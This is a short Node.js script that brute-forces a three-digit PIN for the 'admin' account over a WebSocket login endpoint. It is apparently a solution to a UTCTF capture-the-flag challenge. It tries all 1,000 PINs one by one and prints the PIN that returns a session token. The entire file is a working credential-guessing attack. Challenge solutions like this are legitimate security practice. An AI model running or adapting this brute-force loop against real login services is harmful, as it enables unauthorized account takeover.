const WebSocket = require('ws');

const sleep = ms => new Promise(r => setTimeout(r, ms));

function generateListOfPins() {
    let listOfPins = [];
    for(var x=0; x<10; x++) {
        for (var y=0; y<10; y++) {
            for(var z=0; z<10; z++) {
                listOfPins.push(`${x}${y}${z}`);
            }
        }
    }
    return listOfPins;
}

async function main() {
    const USERNAME = "admin";

    let listOfPins = generateListOfPins();
    
    for(let i=0; i<listOfPins.length; i++) {
        const socket = new WebSocket("ws://web1.utctf.live:8651/internal/ws");
        let password = listOfPins[i];
        socket.addEventListener('message', (event) => {
            console.log(event.data);
            if (event.data == "begin") {
                console.log(`Trying password: ${password}`);
                socket.send("begin");
                socket.send(`user ${USERNAME}`)
                socket.send(`pass ${password}`)
            } else if (event.data == "baduser") {
                // document.querySelector(".error").innerHTML = "Unknown user";
                socket.close()
            } else if (event.data == "badpass") {
                // document.querySelector(".error").innerHTML = "Incorrect PIN";
                socket.close()
            } else if (event.data.startsWith("session ")) {
                console.log("GOOD GOOD GOOD");
                console.log(`PASSWORD IS: ${password}`);
                // document.cookie = "flask-session=" + event.data.replace("session ", "") + ";";
                socket.send("goodbye")
                socket.close();
                
                // window.location = "/internal/user";
            } else {
                // document.querySelector(".error").innerHTML = "Unknown error";
                socket.close();
            }
        });
        await new Promise(r => setTimeout(r, 500));
    }
}

main();